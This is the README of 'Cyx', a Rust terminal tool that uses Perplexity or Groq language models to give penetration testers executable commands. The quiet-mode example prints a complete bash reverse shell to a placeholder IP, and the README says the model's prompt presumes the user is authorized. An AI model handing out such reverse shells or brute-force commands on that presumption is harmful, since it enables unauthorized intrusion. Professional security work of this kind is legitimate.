# Cyx

> Command-first cybersecurity companion for penetration testers and security researchers

Cyx is an LLM-powered terminal tool that delivers instant, executable security commands. Built for speed and accuracy, it provides command-first answers optimized for professionals in the field.

## Features

- **Command-first output** - executable commands before explanations
- **Learn mode** - detailed educational breakdowns with sources
- **Source attribution** - tracks provider, model, and web search status
- **Dual LLM support** - Perplexity (web search) or Groq (fast inference)
- **Flexible output modes** - quiet, verbose, no-tty for scripting

## Quick Start

```bash
# Clone and build
git clone https://github.com/neur0map/cyx.git
cd cyx
cargo build --release

# Setup (first time - interactive wizard)
./target/release/cyx setup

# Use
cyx "nmap stealth scan"
cyx "sql injection bypass waf"
cyx --learn "linux privilege escalation"
```

## Installation

### Prerequisites

- Rust 1.70 or higher
- API key from [Perplexity](https://www.perplexity.ai/settings/api) or [Groq](https://console.groq.com)

### Build from Source

```bash
git clone https://github.com/neur0map/cyx.git
cd cyx
cargo build --release

# Optional: install to PATH
cargo install --path .
```

### Initial Configuration

Run the interactive setup wizard:

```bash
cyx setup
```

This creates `~/.config/cyx/config.toml` with your API key (stored with 600 permissions).

## Usage

### One-Shot Queries

```bash
# Quick command lookup
cyx "reverse shell one liner"
cyx "hydra ssh brute force"

# Learn mode with detailed explanations
cyx --learn "metasploit meterpreter"
cyx -l "nmap service detection"
```


### CLI Options

```
-l, --learn          Educational mode with detailed breakdowns
-q, --quiet          Minimal output (response only, no formatting)
-v, --verbose        Detailed progress information
    --no-tty         Disable TTY features for scripting
```

### Configuration

```bash
cyx config show                           # View current config
cyx config set provider perplexity        # Change provider
cyx setup                                 # Re-run setup wizard
```

Config file: `~/.config/cyx/config.toml`

## Output Examples

### Normal Mode

```
╭─── RESPONSE ──────────────────────────────────────────────
│ ```bash
│ nmap -sS <target>
│ ```
│ TCP SYN stealth scan - doesn't complete handshake. Requires root.
╰──────────────────────────────────────────────────────────

[*] SOURCES
───────────────────────────────────────
Provider: Perplexity (sonar-pro)
Search: Yes (performed web search)

Links:
  - nmap documentation: https://nmap.org/book/synscan.html
  - TCP protocol (RFC 793): https://www.ietf.org/rfc/rfc793.txt
```

### Learn Mode

Detailed breakdowns with flag explanations, how it works, advantages/disadvantages, alternatives, and cited sources.

```bash
cyx --learn "nmap stealth scan"
```

### Quiet Mode

```bash
$ cyx -q "reverse shell bash"
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## Technical Details

### Security

- API keys stored with 600 permissions in `~/.config/cyx/config.toml`
- Read-only operation - provides commands but never executes them
- Timeout protection - all API calls timeout after 120 seconds
- Local-first - all sensitive data remains on your machine

### System Prompts

**Normal mode**: Command-first responses with minimal explanation, assumes authorized testing context, prioritizes executable commands over theory.

**Learn mode**: Educational responses with detailed flag breakdowns, protocol explanations, cited sources, advantages/disadvantages, and alternatives.

## Disclaimer

**For authorized security testing, educational purposes, and defensive research only.**

This tool is designed for:
- Professional penetration testers with written authorization
- Security students in controlled lab environments
- Capture The Flag (CTF) competitions
- Defensive security and threat analysis

Always obtain explicit permission before testing systems you don't own.

## License

MIT License - See [LICENSE](LICENSE) for details.
